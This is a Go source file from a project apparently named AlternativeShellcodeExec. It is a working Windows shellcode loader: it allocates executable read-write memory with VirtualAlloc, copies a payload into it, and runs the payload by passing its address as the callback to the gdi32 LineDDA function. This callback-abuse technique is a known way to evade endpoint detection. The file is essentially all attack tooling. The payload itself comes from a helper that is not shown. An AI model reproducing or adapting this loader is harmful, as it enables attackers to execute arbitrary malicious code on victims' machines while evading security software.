package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_RESERVE            = 0x2000
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

// LineDDACallback 是一个回调函数，将在LineDDA过程中调用
func LineDDACallback(x, y uintptr, lpData uintptr) uintptr {
	fmt.Printf("x: %d, y: %d\n", x, y)
	return 1
}

func Run(op []byte) {
	// 为存储 op 分配内存
	kernel32, _ := syscall.LoadDLL("kernel32.dll")

	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	// Process op array
	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	gdi32 := syscall.NewLazyDLL("gdi32.dll")
	lineDDAProc := gdi32.NewProc("LineDDA")
	//lineDDAProcA := gdi32.NewProc("LineDDAProc")

	startX, startY := 0, 0
	endX, endY := 5, 5

	// 调用 LineDDA
	_, _, err := lineDDAProc.Call(uintptr(startX), uintptr(startY), uintptr(endX), uintptr(endY), addr, 0)
	if err != nil && err != syscall.Errno(0) {
		fmt.Println("LineDDA error:", err)
	}
}

func main() {
	Run(util.ShellCode())
}
